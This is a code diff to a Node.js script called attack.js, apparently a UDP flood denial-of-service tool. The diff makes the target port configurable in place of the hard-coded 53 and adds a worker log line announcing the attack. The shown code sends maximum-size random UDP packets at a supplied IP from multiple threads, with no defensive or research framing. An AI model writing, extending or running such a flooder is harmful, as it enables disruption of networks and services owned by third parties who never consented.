@@ -5,11 +5,12 @@ const process = require('process');
 // Get command-line arguments
 const targetIp = process.argv[2];  // Target IP
 const duration = parseInt(process.argv[3], 10) || 10;  // Duration in seconds (default 10 seconds)
+const port = parseInt(process.argv[4], 10) || 53;  // Port, default to 53 if not provided
 const packetSize = 65507;  // Max UDP packet size (65507 bytes)
 
 // Validate inputs
 if (!targetIp || isNaN(duration) || duration <= 0) {
-    console.error('Usage: node attack.js <IP> <duration>');
+    console.error('Usage: node attack.js <IP> <duration> <port (optional)>');
     process.exit(1);
 }
 
@@ -31,7 +32,7 @@ function udpFlood() {
 
     setInterval(() => {
         const data = generateRandomData(packetSize);  // Generate large random data
-        socket.send(data, 0, data.length, 53, targetIp, (err) => {
+        socket.send(data, 0, data.length, port, targetIp, (err) => {
             if (err) {
                 console.error('Error sending packet:', err);
             } else {
@@ -88,6 +89,7 @@ if (isMainThread) {
 
 } else {
     try {
+        console.log(`Worker started: Attacking ${targetIp} on port ${port} for ${duration} seconds...`);
         // Each worker thread starts flooding the target with large UDP packets
         udpFlood();
     } catch (error) {
